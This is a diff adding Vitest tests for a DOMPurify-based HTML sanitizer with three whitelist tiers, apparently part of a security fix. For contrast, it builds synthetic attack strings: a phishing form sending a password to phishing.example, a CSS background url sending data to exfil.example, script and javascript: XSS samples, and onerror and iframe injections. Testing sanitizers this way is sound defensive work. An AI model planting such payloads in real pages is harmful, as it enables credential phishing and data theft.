@@ -1,5 +1,12 @@
 import { describe, it, expect } from 'vitest'
-import { sanitizeHtml, sanitizeObject } from '@/utils/sanitize'
+import DOMPurify from 'dompurify'
+import {
+  sanitizeHtml,
+  sanitizeTableCellHtml,
+  sanitizeLegalHtml,
+  sanitizeObject,
+} from '@/utils/sanitize'
+import legal from '@/v2/data/legal.json'
 
 describe('sanitize.js - DOMPurify HTML 净化', () => {
   describe('sanitizeHtml', () => {
@@ -170,5 +177,135 @@ describe('sanitize.js - DOMPurify HTML 净化', () => {
       expect(result.article.blocks[0].text).not.toContain('<script>')
       expect(result.article.blocks[1].text).toContain('<strong>重要</strong>')
     })
+  })
+})
+
+/**
+ * F-1：三处 v-html 位点统一走本文件的档位。
+ * 下面这组用例的重点不是"能不能挡住脚本"（宽 profile 本来就挡不住的东西不多），
+ * 而是把**处置前后的差量**测出来：可信域钓鱼表单与 CSS 数据外带在改前是"保留"，改后必须"剥离"。
+ * 样本是合成字符串，不含任何真实课件内容。
+ */
+describe('sanitize.ts · 三档白名单（v-html 唯一入口）', () => {
+  /** 处置前 ReaderTab 的配置，原样搬来做对照，证明漏洞不是推理出来的 */
+  const wideBefore = (html: string) => DOMPurify.sanitize(html, { USE_PROFILES: { html: true } })
+
+  const POLLUTED = [
+    '<p class="lead">正常正文</p>',
+    '<form action="https://phishing.example/login">',
+    '<input name="password" placeholder="请输入密码">',
+    '</form>',
+    '<div style="background:url(https://exfil.example/collect?d=secret)">外带</div>',
+    '<script>alert(1)</script>',
+    '<a href="javascript:alert(2)">点我</a>',
+  ].join('')
+
+  it('真污染样本 · 改前（宽 profile）确实留下了钓鱼表单与 CSS 外带', () => {
+    const before = wideBefore(POLLUTED)
+    // 脚本类本来就进不来——所以这条缺陷的严重性不在 XSS 而在钓鱼／外带，对照要照出这一点
+    expect(before).not.toContain('<script')
+    expect(before).not.toContain('javascript:')
+    // 这两条是改前"保留"、改后"剥离"的差量本体
+    expect(before).toContain('<form')
+    expect(before).toContain('action="https://phishing.example/login"')
+    expect(before).toContain('<input')
+    expect(before).toContain('name="password"')
+    expect(before).toContain('style="background:url(https://exfil.example/collect?d=secret)"')
+  })
+
+  it('真污染样本 · 改后（reader 档）四件构造全部剥离，正常正文不受损', () => {
+    const after = sanitizeHtml(POLLUTED)
+    expect(after).toContain('<p class="lead">正常正文</p>')
+    expect(after).not.toContain('<form')
+    expect(after).not.toContain('phishing.example')
+    expect(after).not.toContain('<input')
+    expect(after).not.toContain('name="password"')
+    expect(after).not.toContain('<button')
+    expect(after).not.toContain('style=')
+    expect(after).not.toContain('exfil.example')
+    expect(after).not.toContain('<script')
+    expect(after).not.toContain('alert')
+    expect(after).not.toContain('javascript:')
+  })
+
+  it('style 属性在三档里一律进不来（CSP style-src 的残留依赖据此可评估）', () => {
+    const html = '<p style="color:red;background:url(https://exfil.example/x)">正文</p>'
+    expect(sanitizeHtml(html)).not.toContain('style=')
+    expect(sanitizeTableCellHtml(html)).not.toContain('style=')
+    expect(sanitizeLegalHtml(html)).not.toContain('style=')
+  })
+
+  it('表格档：内联标签与 class 保留，链接／表单／style 剥离', () => {
+    const cell =
+      '<b>已发布</b><small class="muted">3 天前</small><time datetime="2026-10-01">10-01</time>'
+    expect(sanitizeTableCellHtml(cell)).toContain('<b>已发布</b>')
+    expect(sanitizeTableCellHtml(cell)).toContain('<small class="muted">3 天前</small>')
+    expect(sanitizeTableCellHtml(cell)).toContain('<time')
+    expect(sanitizeTableCellHtml('<a href="https://evil.example">下载</a>')).not.toContain('<a')
+    expect(sanitizeTableCellHtml('<form action="/x"><input name="a"></form>')).not.toContain(
+      '<form',
+    )
+  })
+
+  it('法务档：section＋class 是这一档独有的承载，其余照旧剥离', () => {
+    const html =
+      '<section class="contact-section"><h2>联系我们</h2><p><em>邮箱</em>：a@b.c</p></section>'
+    expect(sanitizeLegalHtml(html)).toBe(html)
+    expect(
+      sanitizeLegalHtml(
+        '<img src="https://evil.example/x.png"><svg><script>alert(1)</script></svg>',
+      ),
+    ).not.toContain('<img')
+    expect(sanitizeLegalHtml('<a href="https://example.com">链接</a>')).not.toContain('<a')
+  })
+
+  it('回归：legal.json 的正文在新档位下与处置前的本地配置逐字节相同（没被悄悄放大或缩小）', () => {
+    const oldLocal = (html: string) =>
+      DOMPurify.sanitize(html, {
+        ALLOWED_TAGS: ['section', 'h2', 'p', 'strong', 'ul', 'li', 'br', 'span', 'em'],
+        ALLOWED_ATTR: ['class'],
+      })
+    const oldTableLocal = (html: string) =>
+      DOMPurify.sanitize(html, {
+        ALLOWED_TAGS: ['b', 'small', 'span', 'i', 'strong', 'br', 'time'],
+        ALLOWED_ATTR: ['class', 'style'],
+      })
+    for (const kind of ['agreement', 'privacy'] as const) {
+      expect(sanitizeLegalHtml(legal[kind].html)).toBe(oldLocal(legal[kind].html))
+    }
+    for (const cell of [
+      '<b>已发布</b>',
+      '<small>草稿</small>',
+      '<span class="chip">3</span>',
+      '<time datetime="2026-10-01">10-01</time>',
+      '<i>待批阅</i><br><strong>2 人</strong>',
+    ]) {
+      expect(sanitizeTableCellHtml(cell)).toBe(oldTableLocal(cell))
+    }
+  })
+
+  it('边界：空串／null／非字符串一律归空串，三档同口径', () => {
+    for (const fn of [sanitizeHtml, sanitizeTableCellHtml, sanitizeLegalHtml]) {
+      expect(fn('')).toBe('')
+      expect(fn(null)).toBe('')
+      expect(fn(undefined)).toBe('')
+      expect(fn(123)).toBe('')
+      expect(fn({})).toBe('')
+    }
+  })
+
+  it('恶意输入：事件属性与危险标签在 reader 档被剥离，展示类标签保留', () => {
+    const html =
+      '<div><h3>标题</h3><ul><li><a href="https://ok.example" target="_blank">正常链接</a></li></ul>' +
+      '<img src="https://ok.example/a.png" onerror="alert(1)"><iframe src="https://evil.example"></iframe>' +
+      '<object data="x"></object><embed src="y"><textarea name="t"></textarea></div>'
+    const out = sanitizeHtml(html)
+    expect(out).toContain('<h3>标题</h3>')
+    expect(out).toContain('<a href="https://ok.example"')
+    expect(out).toContain('target="_blank"')
+    expect(out).toContain('<img src="https://ok.example/a.png"')
+    for (const needle of ['onerror', '<iframe', '<object', '<embed', '<textarea', '<script']) {
+      expect(out, needle).not.toContain(needle)
+    }
   })
 })
